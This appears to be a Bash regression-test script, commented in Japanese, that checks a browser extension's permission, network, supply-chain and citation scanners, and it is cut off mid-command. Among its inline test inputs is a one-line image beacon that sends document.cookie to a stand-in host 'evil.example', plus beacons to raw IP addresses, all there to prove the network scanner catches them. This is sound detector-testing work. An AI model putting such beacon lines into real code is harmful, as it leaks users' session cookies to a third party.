#!/usr/bin/env bash
# 検査器そのものの回帰テスト。
#
# なぜ要るか: 「検査が緑なのに実際は何も検査していなかった」事故は現実に起きている
# （別の検査スクリプトで、字数下限が LC_ALL 未指定のためバイトを数え、1500字下限が実質500字に fail-open した）。
# 検査器は「違反を捕まえられること」と「正しいものを落とさないこと」の両方を実測で示す必要がある。
#
# 判定: 良い検体で exit 0、悪い検体で exit 1。加えて悪い検体では違反行が実際に出力されること。
# set -e には頼らない（途中で落ちて残りの検体が検査されないのを防ぐため）。

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
cd "$ROOT" || exit 1

# --no-verify-recursion: verify.sh 自身を起動する回帰ケースを外す。
# verify.sh の項目8 がこのスクリプトを呼ぶため、外さないと無限再帰する。
# 環境変数ではなく引数にしてある（環境から黙って検査を減らせる口を作らないため）。
RUN_VERIFY_CASES=1
for arg in "$@"; do
  case "$arg" in
    --no-verify-recursion) RUN_VERIFY_CASES=0 ;;
    *) echo "usage: $0 [--no-verify-recursion]"; exit 2 ;;
  esac
done

FIX="test/fixtures"
PASS=0
FAIL=0

# $1=期待exit $2=説明 $3.. = 実行するコマンド
run_case() {
  local want="$1"; shift
  local desc="$1"; shift
  local out rc
  out="$("$@" 2>&1)"
  rc=$?
  if [ "$rc" -ne "$want" ]; then
    echo "[NG] $desc : expected exit=$want got exit=$rc"
    echo "$out" | sed 's/^/       | /'
    FAIL=$((FAIL + 1))
    return 1
  fi
  if [ "$want" -eq 1 ]; then
    # 違反を捕まえたなら、必ず違反行を出しているはず（無言の失敗を許さない）
    if ! echo "$out" | grep -qE '^[^:]+:[0-9]+: '; then
      echo "[NG] $desc : exit=1 だが違反行 (file:line:) を出力していない"
      echo "$out" | sed 's/^/       | /'
      FAIL=$((FAIL + 1))
      return 1
    fi
  fi
  echo "[OK] $desc (exit=$rc)"
  PASS=$((PASS + 1))
  return 0
}

echo "=== scan_permissions.sh の回帰 ==="
run_case 0 "good.json は通る（過検知していない）"        bash tools/scan_permissions.sh "$FIX/good.json"
run_case 1 "bad_allurls.json を捕まえる"                 bash tools/scan_permissions.sh "$FIX/bad_allurls.json"
run_case 1 "bad_tabs.json を捕まえる"                    bash tools/scan_permissions.sh "$FIX/bad_tabs.json"
run_case 1 "bad_csp.json を捕まえる"                     bash tools/scan_permissions.sh "$FIX/bad_csp.json"
run_case 1 "bad_missing_file.json を捕まえる"            bash tools/scan_permissions.sh "$FIX/bad_missing_file.json"
run_case 1 "bad_host_other.json を捕まえる"              bash tools/scan_permissions.sh "$FIX/bad_host_other.json"
run_case 1 "bad_mv2.json を捕まえる"                     bash tools/scan_permissions.sh "$FIX/bad_mv2.json"
run_case 1 "bad_cspremote.json を捕まえる"               bash tools/scan_permissions.sh "$FIX/bad_cspremote.json"
run_case 1 "bad_matches.json を捕まえる"                 bash tools/scan_permissions.sh "$FIX/bad_matches.json"
# トップレベルキーのホワイトリスト（独立検証の指摘5）。
# 「禁止キーを列挙して追う」設計では必ず取り逃がすので、許可集合の外を全部赤にする。
# 架空キーの検体は「本当にホワイトリストか（＝列挙ではないか）」の証明であり、外さないこと。
run_case 1 "bad_extconn.json（externally_connectable）を捕まえる" \
  bash tools/scan_permissions.sh "$FIX/bad_extconn.json"
run_case 1 "bad_background.json（background）を捕まえる" \
  bash tools/scan_permissions.sh "$FIX/bad_background.json"
run_case 1 "bad_unknownkey.json（誰も見たことのない架空キー）を捕まえる＝列挙ではなくホワイトリストである証明" \
  bash tools/scan_permissions.sh "$FIX/bad_unknownkey.json"
run_case 1 "bad_json.json（壊れた JSON）を捕まえる"       bash tools/scan_permissions.sh "$FIX/bad_json.json"
run_case 1 "存在しない manifest を捕まえる"               bash tools/scan_permissions.sh "$FIX/no_such_manifest.json"

echo "=== 違反の中身が出ているかの確認（exit code だけを信じない） ==="
check_msg() {
  local file="$1" pattern="$2" desc="$3" out
  out="$(bash tools/scan_permissions.sh "$FIX/$file" 2>&1)"
  if echo "$out" | grep -q "$pattern"; then
    echo "[OK] $desc"
    PASS=$((PASS + 1))
  else
    echo "[NG] $desc : 出力に '$pattern' が無い"
    echo "$out" | sed 's/^/       | /'
    FAIL=$((FAIL + 1))
  fi
}
check_msg bad_allurls.json      '<all_urls>'   "bad_allurls の違反理由に <all_urls> が出る"
check_msg bad_tabs.json         'tabs'         "bad_tabs の違反理由に tabs が出る"
check_msg bad_csp.json          'unsafe-eval'  "bad_csp の違反理由に unsafe-eval が出る"
check_msg bad_missing_file.json 'nope_does_not_exist.js' "bad_missing_file の違反理由にファイル名が出る"
check_msg bad_extconn.json      'externally_connectable' "bad_extconn の違反理由にキー名が出る"
check_msg bad_background.json   'background'             "bad_background の違反理由にキー名が出る"
check_msg bad_unknownkey.json   'ytvp_flux_capacitor'    "bad_unknownkey の違反理由に架空キー名が出る"

echo "=== scan_network.sh の回帰 ==="
run_case 0 "good_net.js は通る（retrieval( / prefetch を誤検知しない）" \
  bash tools/scan_network.sh "$FIX/good_net.js" "$FIX/good.json"
run_case 1 "bad_net.js（fetch(）を捕まえる" \
  bash tools/scan_network.sh "$FIX/bad_net.js" "$FIX/good.json"
run_case 1 "bad_net_eval.js（eval( / new Function）を捕まえる" \
  bash tools/scan_network.sh "$FIX/bad_net_eval.js" "$FIX/good.json"
run_case 1 "bad_net_url.js（外部 URL）を捕まえる" \
  bash tools/scan_network.sh "$FIX/bad_net_url.js" "$FIX/good.json"
run_case 1 "bad_net_ws.js（WebSocket / XMLHttpRequest）を捕まえる" \
  bash tools/scan_network.sh "$FIX/bad_net_ws.js" "$FIX/good.json"
# 独立検証で見つかった素通り（見落とし1〜3）。検体を置いて赤くなることを機構で押さえる。
run_case 1 "bad_net_protorel.js（プロトコル相対 URL //host）を捕まえる" \
  bash tools/scan_network.sh "$FIX/bad_net_protorel.js" "$FIX/good.json"
run_case 1 "bad_net_rtc.js（WebRTC）を捕まえる" \
  bash tools/scan_network.sh "$FIX/bad_net_rtc.js" "$FIX/good.json"
run_case 1 "bad_net_dynimport.js（動的 import）を捕まえる" \
  bash tools/scan_network.sh "$FIX/bad_net_dynimport.js" "$FIX/good.json"
run_case 1 "bad_net_worker.js（Worker / createObjectURL）を捕まえる" \
  bash tools/scan_network.sh "$FIX/bad_net_worker.js" "$FIX/good.json"
# 過検知の対照。実物の src には行コメントが 90 行以上あるので、// を素朴に拾うと全部赤くなる。
run_case 0 "good_net_comment.js は通る（// 行コメントをプロトコル相対 URL と誤検知しない）" \
  bash tools/scan_network.sh "$FIX/good_net_comment.js" "$FIX/good.json"
# 独立検証で見つかった素通り（最終ラウンド）。プロトコル相対 URL の規則が末尾に英字 TLD
# （\.[A-Za-z]{2,}）を要求していたため、**生 IP 宛て**が1件も当たらなかった。
#   実測: //93.184.216.34/collect → violations=0 / //1.2.3.4:8080/x → violations=0
#         （同じ IP に https を付けると「外部 URL」検査が捕まえていた）
# これは文字列連結でも間接参照でもない素の URL リテラルなので、README が開示した限界の
# 範囲外だった。開示ではなく塞ぐ、と決めた。
run_case 1 "bad_net_protorel_ip.js（生 IPv4 の //1.2.3.4 / ポート付き）を捕まえる" \
  bash tools/scan_network.sh "$FIX/bad_net_protorel_ip.js" "$FIX/good.json"
run_case 1 "bad_net_protorel_ipv6.js（生 IPv6 の //[2001:db8::1] / //[::1]）を捕まえる" \
  bash tools/scan_network.sh "$FIX/bad_net_protorel_ipv6.js" "$FIX/good.json"
# 生 IP を足したことによる過検知の対照。版数・日付めいた "//1.2" を赤くしてはいけない。
run_case 0 "good_net_version.js は通る（\"//1.2\" 等の版数めいた表記を生 IP と誤検知しない）" \
  bash tools/scan_network.sh "$FIX/good_net_version.js" "$FIX/good.json"
# プロセス置換（実際に検体を渡すのに使われた形）でも生 IP を捕まえること。
run_case 1 "1回しか読めない入力でも生 IPv4 のプロトコル相対 URL を捕まえる" \
  bash tools/scan_network.sh <(printf '%s\n' 'var i=new Image(); i.src="//93.184.216.34/collect";') "$FIX/good.json"
run_case 1 "1回しか読めない入力でも生 IPv4 + ポートを捕まえる" \
  bash tools/scan_network.sh <(printf '%s\n' 'var a=document.createElement("a"); a.href="//1.2.3.4:8080/x";') "$FIX/good.json"
# 許可ホストのプロトコル相対 URL は通す（fail-closed し過ぎの対照）。
run_case 0 "//www.youtube.com/ のプロトコル相対 URL は通る" \
  bash tools/scan_network.sh <(printf '%s\n' 'var u="//www.youtube.com/watch";') "$FIX/good.json"
# 複数対象（独立検証の指摘6 で足した口）。2つ目以降の対象が本当に走査されているかを見る。
run_case 0 "複数対象すべてが正常なら通る" \
  bash tools/scan_network.sh "$FIX/good_net.js" "$FIX/good_net_comment.js" "$FIX/good.json"
run_case 1 "複数対象の2つ目に違反があれば捕まえる（先頭しか見ていない実装を落とす）" \
  bash tools/scan_network.sh "$FIX/good_net.js" "$FIX/bad_net_rtc.js" "$FIX/good.json"
# 1回しか読めない入力（プロセス置換 <(...)）。実際にこの形で検体が渡されていた。
# 実体化しないと1回目の走査でパイプが空になり、2回目以降の検査が黙って素通りする（fail-open）。
run_case 1 "1回しか読めない入力でも後段の検査（プロトコル相対 URL）が効く" \
  bash tools/scan_network.sh <(printf '%s\n' 'var i=new Image(); i.src="//evil.example/c?v="+document.cookie;') "$FIX/good.json"
run_case 1 "存在しないスキャン対象を捕まえる" \
  bash tools/scan_network.sh "$FIX/no_such_dir" "$FIX/good.json"
run_case 1 "存在しない manifest を捕まえる" \
  bash tools/scan_network.sh "$FIX/good_net.js" "$FIX/no_such_manifest.json"

check_net_msg() {
  local file="$1" pattern="$2" desc="$3" out
  out="$(bash tools/scan_network.sh "$FIX/$file" "$FIX/good.json" 2>&1)"
  if echo "$out" | grep -q "$pattern"; then
    echo "[OK] $desc"
    PASS=$((PASS + 1))
  else
    echo "[NG] $desc : 出力に '$pattern' が無い"
    echo "$out" | sed 's/^/       | /'
    FAIL=$((FAIL + 1))
  fi
}
check_net_msg bad_net.js          'fetch'                   "bad_net の違反行に fetch が出る"
check_net_msg bad_net_url.js      'https://ads.example.com' "bad_net_url の違反行に外部 URL が出る"
check_net_msg bad_net_protorel.js 'プロトコル相対 URL'      "bad_net_protorel の違反理由が「プロトコル相対 URL」である"
check_net_msg bad_net_protorel.js '//evil.example'          "bad_net_protorel の違反行に該当ホストが出る"
check_net_msg bad_net_rtc.js      'RTCPeerConnection'       "bad_net_rtc の違反行に該当コードが出る"
check_net_msg bad_net_dynimport.js 'import(u)'              "bad_net_dynimport の違反行に該当コードが出る"
check_net_msg bad_net_protorel_ip.js   '//93.184.216.34' "bad_net_protorel_ip の違反行に生 IPv4 が出る"
check_net_msg bad_net_protorel_ip.js   '//1.2.3.4'       "bad_net_protorel_ip の違反行にポート付き生 IPv4 が出る"
check_net_msg bad_net_protorel_ipv6.js '//\[2001:db8::1\]' "bad_net_protorel_ipv6 の違反行に生 IPv6 が出る"

echo "=== scan_supply_chain.sh の回帰（npm 依存ゼロ・ビルド工程ゼロ） ==="
# 実測: README は権限方針4項目を「verify.sh が機械検査する」と書いていたのに、
# 4つ目（npm 依存ゼロ・ビルド工程ゼロ）だけ検査が1行も無かった
#   $ grep -c 'npm|package.json|node_modules' verify.sh  → 0
#
# **検体を作業ツリーに置かず、その場で mktemp -d に組み立てる理由**（黙って外さないために書く）:
#   1. package.json / yarn.lock を test/fixtures/ に置くと、**この検査が検査している当のものを
#      リポジトリに足す**ことになる。検体のために検査対象を汚すのは本末転倒である。
#      （検体を除外するために scan 側へ「test/fixtures だけ見逃す」穴を開けるのはもっと悪い。
#        その穴に本物の依存を置けるようになる。）
#   2. ESM 検体（import 文を含む .js）を置くと verify.sh の項目2（全 .js が node --check を通る）が
#      赤くなる。classic script として構文エラーだからである。
# 代わりに「検体がその場で作られていること」自体は下の good ケース（violations=0）と
# bad ケース（violations>0）の対で担保する。
SC_TMP="$(mktemp -d)"
sc_mktree() { # $1=名前 → $SC_TMP/$1 に「違反の無い最小ツリー」を作る
  mkdir -p "$SC_TMP/$1/src"
  printf "'use strict';\nvar a = 1;\n" > "$SC_TMP/$1/src/app.js"
}
sc_mktree good
sc_mktree lookalike
# 過検知の対照: imports / exported / 動的 import( を ESM 文と誤検知してはいけない
printf "'use strict';\nvar imports = 1;\nvar exported = 2;\nvar f = function(u){ return import(u); };\n// import x from 'y' はコメント\n" \
  > "$SC_TMP/lookalike/src/app.js"
sc_mktree bad_package;   printf '{"name":"x"}\n'      > "$SC_TMP/bad_package/package.json"
sc_mktree bad_npmlock;   printf '{}\n'                > "$SC_TMP/bad_npmlock/package-lock.json"
sc_mktree bad_yarn;      printf '# yarn\n'            > "$SC_TMP/bad_yarn/yarn.lock"
sc_mktree bad_pnpm;      printf 'lockfileVersion: 6\n' > "$SC_TMP/bad_pnpm/pnpm-lock.yaml"
sc_mktree bad_nodemod;   mkdir -p "$SC_TMP/bad_nodemod/node_modules/left-pad"
                         printf 'var x=1;\n'          > "$SC_TMP/bad_nodemod/node_modules/left-pad/index.js"
sc_mktree bad_tsconfig;  printf '{}\n'                > "$SC_TMP/bad_tsconfig/tsconfig.json"
sc_mktree bad_webpack;   printf 'module.exports={};\n' > "$SC_TMP/bad_webpack/webpack.config.js"
sc_mktree bad_vite;      printf 'export default {};\n' > "$SC_TMP/bad_vite/vite.config.ts"
sc_mktree bad_rollup;    printf 'export default {};\n' > "$SC_TMP/bad_rollup/rollup.config.mjs"
sc_mktree bad_esbuild;   printf 'require("esbuild");\n' > "$SC_TMP/bad_esbuild/esbuild.js"
sc_mktree bad_gulp;      printf 'exports.default=1;\n' > "$SC_TMP/bad_gulp/gulpfile.js"
sc_mktree bad_babelrc;   printf '{}\n'                > "$SC_TMP/bad_babelrc/.babelrc"
sc_mktree bad_babelcfg;  printf 'module.exports={};\n' > "$SC_TMP/bad_babelcfg/babel.config.js"
sc_mktree bad_makefile;  printf 'all:\n\techo hi\n'   > "$SC_TMP/bad_makefile/Makefile"
sc_mktree bad_esm;       printf "import { clamp } from './lib/volume.js';\nexport const x = 1;\n" \
                                                       > "$SC_TMP/bad_esm/src/app.js"
mkdir -p "$SC_TMP/bad_nosrc"            # src/ が無い＝ESM 検査が空振り。fail-closed で赤

run_case 0 "違反の無いツリーは通る（過検知していない）"                bash tools/scan_supply_chain.sh "$SC_TMP/good"
run_case 0 "imports / exported / 動的 import( を ESM 文と誤検知しない" bash tools/scan_supply_chain.sh "$SC_TMP/lookalike"
run_case 0 "本物のリポジトリは通る"                                     bash tools/scan_supply_chain.sh
run_case 1 "package.json を捕まえる"           bash tools/scan_supply_chain.sh "$SC_TMP/bad_package"
run_case 1 "package-lock.json を捕まえる"      bash tools/scan_supply_chain.sh "$SC_TMP/bad_npmlock"
run_case 1 "yarn.lock を捕まえる"              bash tools/scan_supply_chain.sh "$SC_TMP/bad_yarn"
run_case 1 "pnpm-lock.yaml を捕まえる"         bash tools/scan_supply_chain.sh "$SC_TMP/bad_pnpm"
run_case 1 "node_modules/ を捕まえる"          bash tools/scan_supply_chain.sh "$SC_TMP/bad_nodemod"
run_case 1 "tsconfig.json を捕まえる"          bash tools/scan_supply_chain.sh "$SC_TMP/bad_tsconfig"
run_case 1 "webpack.config.js を捕まえる"      bash tools/scan_supply_chain.sh "$SC_TMP/bad_webpack"
run_case 1 "vite.config.ts を捕まえる"         bash tools/scan_supply_chain.sh "$SC_TMP/bad_vite"
run_case 1 "rollup.config.mjs を捕まえる"      bash tools/scan_supply_chain.sh "$SC_TMP/bad_rollup"
run_case 1 "esbuild.js を捕まえる"             bash tools/scan_supply_chain.sh "$SC_TMP/bad_esbuild"
run_case 1 "gulpfile.js を捕まえる"            bash tools/scan_supply_chain.sh "$SC_TMP/bad_gulp"
run_case 1 ".babelrc を捕まえる"               bash tools/scan_supply_chain.sh "$SC_TMP/bad_babelrc"
run_case 1 "babel.config.js を捕まえる"        bash tools/scan_supply_chain.sh "$SC_TMP/bad_babelcfg"
run_case 1 "Makefile を捕まえる"               bash tools/scan_supply_chain.sh "$SC_TMP/bad_makefile"
run_case 1 "src/ の ESM import/export 文を捕まえる" bash tools/scan_supply_chain.sh "$SC_TMP/bad_esm"
run_case 1 "src/ が無いツリーを fail-closed で捕まえる" bash tools/scan_supply_chain.sh "$SC_TMP/bad_nosrc"
run_case 1 "存在しない root を捕まえる"        bash tools/scan_supply_chain.sh "$SC_TMP/no_such_root"

sc_msg() { # $1=検体ディレクトリ $2=期待する語 $3=説明
  local out
  out="$(bash tools/scan_supply_chain.sh "$SC_TMP/$1" 2>&1)"
  if echo "$out" | grep -q "$2"; then
    echo "[OK] $3"
    PASS=$((PASS + 1))
  else
    echo "[NG] $3 : 出力に '$2' が無い"
    echo "$out" | sed 's/^/       | /'
    FAIL=$((FAIL + 1))
  fi
}
sc_msg bad_package  'package.json:0:'  "bad_package の違反行にファイル名と行番号が出る"
sc_msg bad_nodemod  'node_modules'     "bad_nodemod の違反行に node_modules が出る"
sc_msg bad_tsconfig 'ビルド工程'        "bad_tsconfig の違反理由が「ビルド工程」である"
sc_msg bad_esm      'ESM'              "bad_esm の違反理由が「ESM の import/export 文」である"
sc_msg bad_esm      'src/app.js:1:'    "bad_esm の違反行に file:行番号 が出る"

rm -rf "$SC_TMP"

echo "=== list_scan_targets.sh の回帰（何を走査するか自体を検査する） ==="
# 独立検証の指摘6:「通信スキャンの対象が src/ 固定」＝ src の外に置けば走査されない。
# 対象の収集規則そのものを検査しないと、検査器が緑でも中身が空という事故が起きる。
run_case 0 "本物のリポジトリで対象を収集できる" bash tools/list_scan_targets.sh
run_case 1 "存在しない root を捕まえる"          bash tools/list_scan_targets.sh "$FIX/no_such_root"

# 検体ツリー: src/ の外の置き忘れ（stray.js / extra/nested.js）を拾い、
# 検体置き場（test/）と検査器置き場（tools/）を除外することを、期待値の完全一致で見る。
scantree_expect="$(printf '%s\n' 'assets/blob.bin' 'extra/nested.js' 'src/app.js' 'stray.js')"
scantree_got="$(bash tools/list_scan_targets.sh "$FIX/scantree" 2>&1)"
if [ "$scantree_got" = "$scantree_expect" ]; then
  echo "[OK] scantree の収集結果が期待値と完全一致（src 外の置き忘れを拾い、test/ tools/ を除外する）"
  PASS=$((PASS + 1))
else
  echo "[NG] scantree の収集結果が期待値と違う"
  echo "     expected:"; printf '%s\n' "$scantree_expect" | sed 's/^/       | /'
  echo "     got:";      printf '%s\n' "$scantree_got"    | sed 's/^/       | /'
  FAIL=$((FAIL + 1))
fi

scantree_has() {
  local want="$1" mode="$2" desc="$3"   # mode = in | out
  if printf '%s\n' "$scantree_got" | grep -qxF "$want"; then
    if [ "$mode" = "in" ]; then echo "[OK] $desc"; PASS=$((PASS + 1));
    else echo "[NG] $desc : 除外されるはずの $want が入っている"; FAIL=$((FAIL + 1)); fi
  else
    if [ "$mode" = "out" ]; then echo "[OK] $desc"; PASS=$((PASS + 1));
    else echo "[NG] $desc : 入るはずの $want が無い"; FAIL=$((FAIL + 1)); fi
  fi
}
scantree_has 'stray.js'               in  "src/ の外の置き忘れ（stray.js）を走査対象に入れる"
scantree_has 'extra/nested.js'        in  "src/ でも直下でもない場所のコードを走査対象に入れる"
scantree_has 'assets/blob.bin'        in  "manifest が参照するなら拡張子に関係なく走査対象に入れる"
scantree_has 'test/fixtures/decoy.js' out "検体置き場（test/）を走査対象から外す"
scantree_has 'tools/scanner_decoy.js' out "検査器置き場（tools/）を走査対象から外す"
scantree_has 'notes.md'               out "ドキュメント（.md）を走査対象から外す"
scantree_has 'manifest.json'          out "manifest 自身は出さない（呼び出し側が別途渡すため）"

echo "=== scan_static.sh の回帰 ==="
run_case 0 "popup_good.html は通る（過検知していない）" \
  bash tools/scan_static.sh popup "$FIX/popup_good.html"
run_case 1 "popup_bad_inline.html（インライン script）を捕まえる" \
  bash tools/scan_static.sh popup "$FIX/popup_bad_inline.html"
run_case 1 "popup_bad_handler.html（onclick=）を捕まえる" \
  bash tools/scan_static.sh popup "$FIX/popup_bad_handler.html"
run_case 1 "存在しない popup を捕まえる" \
  bash tools/scan_static.sh popup "$FIX/no_such_popup.html"
run_case 0 "overlay_good.js は通る（過検知していない）" \
  bash tools/scan_static.sh overlay "$FIX/overlay_good.js"
run_case 1 "overlay_bad_chrome.js（chrome. 参照）を捕まえる" \
  bash tools/scan_static.sh overlay "$FIX/overlay_bad_chrome.js"
run_case 1 "存在しない overlay を捕まえる" \
  bash tools/scan_static.sh overlay "$FIX/no_such_overlay.js"

echo "=== scan_doc_cites.sh の回帰（文書の引用が腐っていないか） ==="
# なぜ要るか: INSTALL.md は「根拠は推測ではなく manifest とコード」と自称しているのに、
# その自称を検査する機構が無いまま書かれていた。結果、行番号が外れた引用が4件残った
# （抜き取りで2件、その後の全数検算でさらに2件）。
# ここで見るのは「壊した引用で本当に赤くなるか」と「正しい引用を落とさないか」の両側。
DOCS="$FIX/docs"
run_case 0 "cite_good.md は通る（過検知していない）" \
  bash tools/scan_doc_cites.sh "$DOCS/cite_good.md"
run_case 1 "cite_bad_missing.md（存在しないファイルを引く）を捕まえる" \
  bash tools/scan_doc_cites.sh "$DOCS/cite_bad_missing.md"
run_case 1 "cite_bad_range.md（行数を超えた行番号）を捕まえる" \
  bash tools/scan_doc_cites.sh "$DOCS/cite_bad_range.md"
run_case 1 "cite_bad_reversed.md（範囲が逆向き N>M）を捕まえる" \
  bash tools/scan_doc_cites.sh "$DOCS/cite_bad_reversed.md"
# ★範囲チェックだけでは絶対に捕まらない形。今回の NG-1 がこれだった。
run_case 1 "cite_bad_anchor.md（行番号は範囲内だが内容が違う）を捕まえる" \
  bash tools/scan_doc_cites.sh "$DOCS/cite_bad_anchor.md"
run_case 1 "cite_bad_ng1_regression.md（実際に起きた NG-1 の逐語再現）を捕まえる" \
  bash tools/scan_doc_cites.sh "$DOCS/cite_bad_ng1_regression.md"
run_case 1 "存在しないマークダウンを捕まえる" \
  bash tools/scan_doc_cites.sh "$DOCS/no_such_doc.md"

check_cite_msg() {
  local file="$1" pattern="$2" desc="$3" out
  out="$(bash tools/scan_doc_cites.sh "$DOCS/$file" 2>&1)"
  if echo "$out" | grep -q "$pattern"; then
    echo "[OK] $desc"
    PASS=$((PASS + 1))
  else
    echo "[NG] $desc : 出力に '$pattern' が無い"
    echo "$out" | sed 's/^/       | /'
    FAIL=$((FAIL + 1))
  fi
}
check_cite_msg cite_bad_missing.md  '引用先のファイルが存在しない'   "cite_bad_missing の違反理由がファイル不在である"
check_cite_msg cite_bad_range.md    'ファイルの行数を超えている'     "cite_bad_range の違反理由が行数超過である"
check_cite_msg cite_bad_reversed.md '範囲が逆向き'                   "cite_bad_reversed の違反理由が逆向き範囲である"
check_cite_msg cite_bad_anchor.md   'DEFAULT_PRESETS'                "cite_bad_anchor の違反行に探したアンカー語が出る"
check_cite_msg cite_bad_ng1_regression.md 'wiring.js:87-89'          "NG-1 再現の違反行に元の引用がそのまま出る"

echo "=== scan_doc_cites.sh が空振りしていないことの実測 ==="
# 「適用できる引用だけ検査し、できないものは飛ばす」設計なので、規則が当たらなくなると
# 全件スキップ＝何も検査していない状態でも緑になれてしまう。下限を機構で押さえる。
run_case 0 "cite_good.md でも内容一致まで4件以上を実際に検査している" \
  bash tools/scan_doc_cites.sh --min-anchor-checked 4 "$DOCS/cite_good.md"
run_case 1 "下限を満たさないとき赤くなる（空振り検知そのものが効いている証明）" \
  bash tools/scan_doc_cites.sh --min-anchor-checked 999 "$DOCS/cite_good.md"
run_case 0 "本物の INSTALL.md が通る（腐っていた4件を直した後の状態）" \
  bash tools/scan_doc_cites.sh INSTALL.md
run_case 0 "本物の INSTALL.md で内容一致まで検査できた引用が10件以上ある" \
  bash tools/scan_doc_cites.sh --min-anchor-checked 10 INSTALL.md

echo "=== テスト自身の回帰（わざと壊した実装で本当に落ちるか） ==="
# 実装が正しいときに緑になることは verify.sh の項目3が見ている。
# ここで見るのは逆側＝「壊れた実装を食わせたら赤くなるか」。
# 過去に「検査が緑なのに何も検査していなかった」事故があるので、両側を実測する。
mutant_case() {
  local mutant="$1" want_test="$2" desc="$3" out rc
  out="$(YTVP_VOLUME_PATH="$FIX/mutants/$mutant" node --test test/volume.test.js 2>&1)"
  rc=$?
  if [ "$rc" -eq 0 ]; then
    echo "[NG] $desc : 壊した実装なのにテストが緑になった（fail-open）"
    FAIL=$((FAIL + 1))
    return 1
  fi
  if ! echo "$out" | grep -q "$want_test"; then
    echo "[NG] $desc : 落ちるべきテスト '$want_test' が失敗一覧に無い"
    echo "$out" | grep -E '^not ok' | sed 's/^/       | /'
    FAIL=$((FAIL + 1))
    return 1
  fi
  echo "[OK] $desc (exit=$rc / '$want_test' が落ちた)"
  PASS=$((PASS + 1))
  return 0
}
mutant_case volume_noclamp.js        'clampVolume: 上限' \
  "上限クランプを外した実装を volume.test.js が捕まえる"
mutant_case volume_nofallback.js     'clampVolume: 解釈不能' \
  "fallback を返さない実装を volume.test.js が捕まえる"
mutant_case volume_shared_default.js 'normalizePresets: 配列以外' \
  "DEFAULT_PRESETS を同一参照で返す実装を volume.test.js が捕まえる"
mutant_case volume_parse_clamps.js   'parseVolumeInput: クランプしない' \
  "parseVolumeInput がクランプする実装を volume.test.js が捕まえる"

# $1=検体 $2=落ちるべきテスト名 $3=説明
# exit code だけを見てはいけない。検体の manifest は「SPEC 第1章のファイルが参照されている」
# テストを必ず落とす（検体は src/content.js を参照していないため）ので、rc!=0 は
# **狙った検査を消しても成立してしまう**。落ちるべきテスト名まで突き合わせる。
manifest_case() {
  local fixture="$1" want_test="$2" desc="$3" out rc
  out="$(YTVP_MANIFEST_PATH="$FIX/$fixture" node --test test/manifest.test.js 2>&1)"
  rc=$?
  if [ "$rc" -eq 0 ]; then
    echo "[NG] $desc : 違反 manifest なのにテストが緑になった（fail-open）"
    FAIL=$((FAIL + 1))
    return 1
  fi
  if ! echo "$out" | grep '^not ok' | grep -qF "$want_test"; then
    echo "[NG] $desc : 落ちるべきテスト '$want_test' が失敗一覧に無い"
    echo "$out" | grep '^not ok' | sed 's/^/       | /'
    FAIL=$((FAIL + 1))
    return 1
  fi
  echo "[OK] $desc (exit=$rc / '$want_test' が落ちた)"
  PASS=$((PASS + 1))
  return 0
}
manifest_case bad_tabs.json    'permissions は ["storage"] と完全一致' \
  "permissions に tabs のある manifest を manifest.test.js が捕まえる"
manifest_case bad_allurls.json '禁止権限トークンを一切含まない' \
  "<all_urls> のある manifest を manifest.test.js が捕まえる"
manifest_case bad_mv2.json     'manifest_version === 3' \
  "manifest_version=2 を manifest.test.js が捕まえる"
# トップレベルキーのホワイトリスト（独立検証の指摘5）。scan_permissions.sh とは別実装なので
# 両方に入れてある（片方の穴をもう片方が埋める狙い。従来の方針を維持）。
manifest_case bad_extconn.json    'トップレベルキーがホワイトリストに収まる' \
  "externally_connectable のある manifest を manifest.test.js が捕まえる"
manifest_case bad_background.json 'トップレベルキーがホワイトリストに収まる' \
  "background のある manifest を manifest.test.js が捕まえる"
manifest_case bad_unknownkey.json 'トップレベルキーがホワイトリストに収まる' \
  "架空キーのある manifest を manifest.test.js が捕まえる＝列挙ではなくホワイトリストである証明"

echo "=== scan_contract.sh の回帰（SPEC 7章の契約） ==="
run_case 1 "content_bad_wheel.js（wheel リスナ）を捕まえる" \
  bash tools/scan_contract.sh nowheel "$FIX/contract/content_bad_wheel.js"
run_case 0 "content_good_nowheel.js は通る（コメント中の wheel を誤検知しない）" \
  bash tools/scan_contract.sh nowheel "$FIX/contract/content_good_nowheel.js"
run_case 1 "overlay_bad_noroot.js（ytvp-root 無し）を捕まえる" \
  bash tools/scan_contract.sh overlayroot "$FIX/contract/overlay_bad_noroot.js"
run_case 0 "overlay_good_root.js は通る（過検知していない）" \
  bash tools/scan_contract.sh overlayroot "$FIX/contract/overlay_good_root.js"
run_case 1 "存在しない content を捕まえる" \
  bash tools/scan_contract.sh nowheel "$FIX/contract/no_such_content.js"
run_case 1 "存在しない overlay を捕まえる" \
  bash tools/scan_contract.sh overlayroot "$FIX/contract/no_such_overlay.js"

check_contract_msg() {
  local mode="$1" file="$2" pattern="$3" desc="$4" out
  out="$(bash tools/scan_contract.sh "$mode" "$FIX/contract/$file" 2>&1)"
  if echo "$out" | grep -q "$pattern"; then
    echo "[OK] $desc"
    PASS=$((PASS + 1))
  else
    echo "[NG] $desc : 出力に [$pattern] が無い"
    echo "$out" | sed 's/^/       | /'
    FAIL=$((FAIL + 1))
  fi
}
check_contract_msg nowheel     content_bad_wheel.js  "addEventListener" "content_bad_wheel の違反行に該当コードが出る"
check_contract_msg overlayroot overlay_bad_noroot.js "ytvp-root"        "overlay_bad_noroot の違反理由に ytvp-root が出る"

echo "=== scan_hooks.sh の回帰（環境変数フックの宣言と unset の一致） ==="
hook_case() {
  local want="$1" dir="$2" desc="$3"
  run_case "$want" "$desc" bash tools/scan_hooks.sh \
    "$FIX/hooks/$dir/def.sh" "$FIX/hooks/$dir/verify_stub.sh" "$FIX/hooks/$dir/code"
}
hook_case 0 good           "宣言・使用・unset が一致した検体は通る（過検知していない）"
hook_case 1 bad_undeclared "未宣言のフック（あとから足された口）を捕まえる"
hook_case 1 bad_nounset    "verify がフックを unset していない検体を捕まえる"
hook_case 1 bad_unused     "誰も読まない腐った宣言を捕まえる"
run_case 1 "存在しないフック定義ファイルを捕まえる" \
  bash tools/scan_hooks.sh "$FIX/hooks/no_such_def.sh" "$FIX/hooks/good/verify_stub.sh" "$FIX/hooks/good/code"
run_case 1 "存在しない verify を捕まえる" \
  bash tools/scan_hooks.sh "$FIX/hooks/good/def.sh" "$FIX/hooks/no_such_verify.sh" "$FIX/hooks/good/code"
run_case 0 "本番の定義（tools/lib/env_hooks.sh）と verify.sh が一致している" \
